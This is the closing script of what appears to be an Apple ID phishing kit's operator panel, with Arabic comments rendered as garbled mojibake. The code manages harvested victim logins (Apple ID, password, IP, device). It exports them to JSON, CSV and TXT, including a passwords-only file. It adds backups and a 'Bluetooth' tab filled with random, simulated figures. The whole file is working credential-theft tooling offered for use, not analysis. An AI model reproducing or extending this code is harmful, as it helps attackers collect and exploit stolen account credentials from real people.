        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«
        function simulateBluetoothData() {
            setInterval(() => {
                if (currentTab === 'bluetooth') {
                    updateBluetoothStats();
                    displayBluetoothData();
                }
            }, 3000);
        }
        
        // ØªØ­Ø¯ÙŠØ« Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«
        function updateBluetoothStats() {
            document.getElementById('bluetoothConnections').textContent = bluetoothData.length;
            document.getElementById('mobileDevices').textContent = 
                bluetoothData.filter(d => d.device === 'mobile').length;
            document.getElementById('bluetoothDataCount').textContent = bluetoothData.length;
            document.getElementById('transferSpeed').textContent = 
                Math.floor(Math.random() * 100) + 50;
        }
        
        // Ø¹Ø±Ø¶ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«
        function displayBluetoothData() {
            const tbody = document.getElementById('bluetoothBody');
            const emptyState = document.getElementById('emptyBluetooth');
            
            if (bluetoothData.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            let html = '';
            bluetoothData.slice(0, 20).forEach((data, index) => {
                const time = new Date(data.timestamp).toLocaleString('ar-SA');
                const deviceType = data.device === 'mobile' ? 'ğŸ“± Ù‡Ø§ØªÙ' : 'ğŸ’» ÙƒÙ…Ø¨ÙŠÙˆØªØ±';
                const signalStrength = Math.floor(Math.random() * 100) + '%';
                const dataSize = Math.floor(Math.random() * 1000) + 100 + ' Ùƒ.Ø¨';
                const dataType = data.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const status = 'âœ… Ù†Ø§Ø¬Ø­';
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td>${deviceType}</td>
                    <td>${signalStrength}</td>
                    <td>${dataSize}</td>
                    <td>${dataType}</td>
                    <td>${status}</td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø¥Ø¸Ù‡Ø§Ø± Ø¥Ø´Ø¹Ø§Ø±
        function showNotification(message, type = 'info') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.background = type === 'error' ? 'var(--danger)' : 
                                         type === 'warning' ? 'var(--warning)' : 
                                         type === 'success' ? 'var(--success)' : 'var(--primary)';
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
        
        // ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø©
        function refreshAllData() {
            loadAllData();
            showNotification('ØªÙ… ØªØ­Ø¯ÙŠØ« Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'success');
        }
        
        function refreshCredentials() {
            loadCredentials();
            showNotification('ØªÙ… ØªØ­Ø¯ÙŠØ« Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„', 'success');
        }
        
        function refreshMobileData() {
            loadMobileData();
            showNotification('ØªÙ… ØªØ­Ø¯ÙŠØ« Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ', 'success');
        }
        
        function deleteAllCredentials() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ØŸ Ù‡Ø°Ø§ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ØªØ±Ø§Ø¬Ø¹ Ø¹Ù†Ù‡.')) {
                allCredentials = [];
                mobileData = [];
                localStorage.removeItem('apple_credentials');
                localStorage.removeItem('mobile_credentials');
                displayCredentials();
                displayMobileData();
                updateStats();
                showNotification('ØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'success');
            }
        }
        
        function simulateBluetooth() {
            const mockData = {
                type: 'bluetooth_transfer',
                timestamp: new Date().toISOString(),
                device: 'mobile',
                data: {
                    appleId: 'test@example.com',
                    ip: '192.168.1.1',
                    deviceType: 'mobile'
                }
            };
            
            bluetoothData.unshift(mockData);
            updateBluetoothStats();
            displayBluetoothData();
            showNotification('ØªÙ… Ù…Ø­Ø§ÙƒØ§Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù„Ø§Ø¹Ø© Ø¬Ø¯ÙŠØ¯Ø©', 'success');
        }
        
        function clearBluetoothCache() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ ØªÙ†Ø¸ÙŠÙ Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«ØŸ')) {
                bluetoothData = [];
                localStorage.removeItem('bluetooth_data');
                localStorage.removeItem('bluetooth_cache');
                updateBluetoothStats();
                displayBluetoothData();
                showNotification('ØªÙ… ØªÙ†Ø¸ÙŠÙ Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«', 'success');
            }
        }
        
        // ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function exportFormat(format) {
            const data = {
                credentials: allCredentials,
                visits: allVisits,
                mobile: mobileData,
                bluetooth: bluetoothData,
                exportedAt: new Date().toISOString(),
                total: allCredentials.length + allVisits.length + mobileData.length + bluetoothData.length
            };
            
            let content, filename, mimeType;
            
            switch (format) {
                case 'json':
                    content = JSON.stringify(data, null, 2);
                    filename = `apple_data_${Date.now()}.json`;
                    mimeType = 'application/json';
                    break;
                    
                case 'csv':
                    content = convertToCSV(data);
                    filename = `apple_data_${Date.now()}.csv`;
                    mimeType = 'text/csv';
                    break;
                    
                case 'txt':
                    content = convertToTXT(data);
                    filename = `apple_data_${Date.now()}.txt`;
                    mimeType = 'text/plain';
                    break;
                    
                default:
                    showNotification('ØªÙ†Ø³ÙŠÙ‚ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ', 'error');
                    return;
            }
            
            downloadFile(content, filename, mimeType);
            showNotification(`ØªÙ… Ø§Ù„ØªØµØ¯ÙŠØ± ÙƒÙ€ ${format.toUpperCase()}`, 'success');
        }
        
        // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ CSV
        function convertToCSV(data) {
            let csv = 'Type,AppleID,Password,IP,Time,Device,Browser,Source\n';
            
            // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
            data.credentials.forEach(cred => {
                const device = cred.deviceType === 'mobile' ? 'mobile' : 'desktop';
                const browser = getBrowserName(cred.userAgent);
                csv += `Credential,"${cred.appleId}","${cred.password}","${cred.ip}","${cred.timestamp}","${device}","${browser}","main"\n`;
            });
            
            return csv;
        }
        
        // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ Ù†Øµ
        function convertToTXT(data) {
            let text = '='.repeat(80) + '\n';
            text += 'ØªÙ‚Ø±ÙŠØ± Ø¨ÙŠØ§Ù†Ø§Øª Apple Ø§Ù„ÙƒØ§Ù…Ù„\n';
            text += '='.repeat(80) + '\n\n';
            
            text += `â€¢ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„: ${data.credentials.length}\n`;
            text += `â€¢ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª: ${data.visits.length}\n`;
            text += `â€¢ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ: ${data.mobile.length}\n`;
            text += `â€¢ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«: ${data.bluetooth.length}\n`;
            text += `â€¢ Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: ${data.total}\n\n`;
            
            text += 'ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„:\n';
            text += 'â”€'.repeat(40) + '\n';
            data.credentials.forEach((cred, index) => {
                text += `\n${index + 1}. ${cred.appleId}\n`;
                text += `   ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${cred.password}\n`;
                text += `   IP: ${cred.ip}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(cred.timestamp).toLocaleString('ar-SA')}\n`;
                text += `   Ø§Ù„Ø¬Ù‡Ø§Ø²: ${cred.deviceType === 'mobile' ? 'Ù‡Ø§ØªÙ' : 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}\n`;
            });
            
            text += '\n' + '='.repeat(80) + '\n';
            text += `Ù…ÙØµØ¯Ø± ÙÙŠ: ${new Date(data.exportedAt).toLocaleString('ar-SA')}\n`;
            text += '='.repeat(80);
            
            return text;
        }
        
        // ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù
        function downloadFile(content, filename, mimeType) {
            try {
                const blob = new Blob([content], { type: mimeType });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 100);
                
                return true;
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù:', error);
                return false;
            }
        }
        
        // ØªØµØ¯ÙŠØ± ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± ÙÙ‚Ø·
        function exportCredentialsOnly() {
            if (allCredentials.length === 0) {
                showNotification('Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ù„Ù„ØªØµØ¯ÙŠØ±', 'warning');
                return;
            }
            
            let text = 'ğŸ” ÙƒÙ„Ù…Ø§Øª Ù…Ø±ÙˆØ± Apple\n';
            text += '='.repeat(50) + '\n\n';
            
            allCredentials.forEach((cred, index) => {
                text += `${index + 1}. ${cred.appleId}\n`;
                text += `   ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${cred.password}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(cred.timestamp).toLocaleString('ar-SA')}\n`;
                text += `   IP: ${cred.ip}\n`;
                text += `   Ø§Ù„Ø¬Ù‡Ø§Ø²: ${cred.deviceType === 'mobile' ? 'Ù‡Ø§ØªÙ' : 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}\n`;
                text += '   ' + '-'.repeat(30) + '\n\n';
            });
            
            downloadFile(text, `apple_passwords_${Date.now()}.txt`, 'text/plain');
            showNotification('ØªÙ… ØªØµØ¯ÙŠØ± ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±', 'success');
        }
        
        // ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªÙ†Ø³ÙŠÙ‚Ø§Øª
        function exportAllFormats() {
            exportFormat('json');
            setTimeout(() => exportFormat('csv'), 500);
            setTimeout(() => exportFormat('txt'), 1000);
            setTimeout(() => showNotification('ØªÙ… ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªÙ†Ø³ÙŠÙ‚Ø§Øª', 'success'), 1500);
        }
        
        // Ø¥Ù†Ø´Ø§Ø¡ Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©
        function createBackup() {
            const backup = {
                credentials: allCredentials,
                visits: allVisits,
                mobile: mobileData,
                bluetooth: bluetoothData,
                backupTime: new Date().toISOString(),
                version: '3.0.0'
            };
            
            const content = JSON.stringify(backup, null, 2);
            downloadFile(content, `apple_backup_${Date.now()}.json`, 'application/json');
            showNotification('ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© ÙƒØ§Ù…Ù„Ø©', 'success');
        }
    </script>
</body>
</html>
